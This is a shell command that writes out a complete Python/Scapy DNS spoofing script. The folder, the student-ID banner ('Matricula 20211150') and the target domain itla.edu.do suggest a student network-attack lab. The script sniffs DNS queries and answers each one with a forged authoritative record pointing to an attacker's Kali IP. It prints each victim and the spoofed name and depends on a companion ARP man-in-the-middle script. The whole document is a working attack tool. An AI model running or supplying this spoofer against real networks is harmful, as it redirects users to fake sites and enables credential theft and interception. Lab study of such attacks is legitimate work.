cat > ~/ataques_20211150/07_dns_spoofing.py << 'EOF'
#!/usr/bin/env python3
import sys, signal, threading
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sniff, send, conf

INTERFAZ  = "eth0"
IP_FALSA  = "20.21.11.50"
DOMINIO   = "itla.edu.do"
TTL_FALSO = 300
corriendo  = True
queries    = 0
respondidas = 0

def salir(sig, frame):
    global corriendo
    print(f"\n[!] Detenido.")
    print(f"    Queries interceptadas : {queries}")
    print(f"    Respuestas falsas     : {respondidas}")
    corriendo = False
    sys.exit(0)

def manejar_dns(pkt):
    global queries, respondidas
    if not (pkt.haslayer(DNS) and pkt.haslayer(IP)):
        return
    if not pkt.haslayer(DNSQR):
        return
    if pkt[DNS].qr != 0:
        return
    if pkt[IP].src == IP_FALSA:
        return

    nombre     = pkt[DNSQR].qname.decode('utf-8', errors='replace')
    victima_ip = pkt[IP].src
    queries   += 1

    respuesta = (
        IP(src=pkt[IP].dst, dst=victima_ip)
        / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
        / DNS(
            id=pkt[DNS].id,
            qr=1, aa=1,
            qd=pkt[DNS].qd,
            an=DNSRR(
                rrname=nombre,
                type="A",
                ttl=TTL_FALSO,
                rdata=IP_FALSA
            )
        )
    )
    send(respuesta, iface=INTERFAZ, verbose=False)
    respondidas += 1
    print(f"\n  [SPOOFED] {victima_ip} pregunto: {nombre.rstrip('.')}")
    print(f"            Respondido con: {IP_FALSA} (sitio falso)")
    print(f"            Visita: http://{IP_FALSA} para ver el sitio falso")

def stats():
    import time
    while corriendo:
        time.sleep(10)
        if queries > 0:
            print(f"\n  [STATS] Queries: {queries}  Spoofed: {respondidas}")

def main():
    global INTERFAZ, IP_FALSA
    if len(sys.argv) > 1: INTERFAZ = sys.argv[1]
    if len(sys.argv) > 2: IP_FALSA = sys.argv[2]

    signal.signal(signal.SIGINT, salir)
    conf.verb = 0

    print("=" * 52)
    print("  ATAQUE DNS Spoofing - Matricula 20211150")
    print("=" * 52)
    print(f"  Interfaz  : {INTERFAZ}")
    print(f"  Atacante  : {IP_FALSA} (Kali)")
    print(f"  Dominio   : {DOMINIO} → {IP_FALSA}")
    print(f"  Sitio web : http://{IP_FALSA}")
    print("=" * 52)
    print()
    print("  REQUIERE en otra terminal:")
    print("  sudo python3 02_arp_mitm.py eth0")
    print()
    print("  Escuchando queries DNS... Ctrl+C para detener\n")

    threading.Thread(target=stats, daemon=True).start()

    sniff(
        iface=INTERFAZ,
        filter="udp port 53",
        prn=manejar_dns,
        store=False,
        stop_filter=lambda _: not corriendo
    )

if __name__ == "__main__":
    main()
EOF
echo "DNS Spoofing actualizado OK"
